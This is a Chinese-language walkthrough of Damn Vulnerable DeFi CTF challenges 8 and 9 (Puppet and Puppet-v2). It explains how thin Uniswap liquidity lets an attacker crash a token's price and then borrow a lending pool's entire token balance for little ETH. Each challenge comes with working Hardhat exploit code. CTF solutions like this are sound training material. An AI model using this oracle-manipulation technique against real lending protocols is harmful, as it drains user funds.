# Damn Defi靶场刷题记录(8-9)

    author: Thomas_Xu

## 8 Puppet
这个题直接通过abi引用了一个已经编译了的Uniswap v1的合约，因此，我们可以假定这个Uniswap合约没有其他漏洞。
那就让我们把目光集中在`PuppetPool`合约
其实就一个`borrow()`函数，但在借款时，我们需要抵押两倍的资金在池里。这个题其实就是想要我们想办法让池在我们抵押不足的情况下贷款给我们。
这其实就涉及到uniswap的原理了，有关uniswap v1我推荐看[这篇文章](https://bbs.csdn.net/topics/606753811)
在了解了uniswap v1后，我们就应该知道，流动性对于一个uniswap池有多么重要，而题目中的这个池，其实并没有足够多的流动性来应对大规模的买进卖出。
> 因此我们只需要出售我们手中所有的token，就会导致市场崩盘，价格失衡。(token大幅度贬值)，那么我们手中的ETH将会非常值钱，这时候我们再调用borrow函数，由于token的贬值，我们可以通过抵押我们手中的ETH获得几乎全部的token。

* **Exploit**
```
it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(
            ATTACKER_INITIAL_TOKEN_BALANCE.sub(1),
            1,
            9999999999
        );
        // 先计算borrow所有的token需要多少的eth
        const amount = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE, {value:amount});
    });
```

## 9 Puppet-v2
相比于上一道题，这次使用的时Uniswap-v2的源码，而交易所借款需要抵押的eth从借款价格的2倍变为了3倍。
但其实再了解Uniswap-v2以及这次的交易所代码后，发现其实和上道题没有本质的区别。
我们任然可以利用池中流动性不足这一点，引起价格的波动，使token贬值，以达到我们以少数eth借到大量token的目的。

* **Exploit**
```
 it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        // 在交易所置换自己所有的token
        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(
            ATTACKER_INITIAL_TOKEN_BALANCE,
            0,
            [this.token.address, this.uniswapRouter.WETH()],
            attacker.address,
            9999999999
        );
        
        console.log('Attacker`s balance:', (await ethers.provider.getBalance(attacker.address)).toString());
        //计算borrow所有token所需要的eth
        const amount = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
        //先往钱包里存钱
        await this.weth.connect(attacker).deposit({value:amount});
        await this.weth.connect(attacker).approve(this.lendingPool.address, amount);
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE);
    });
```
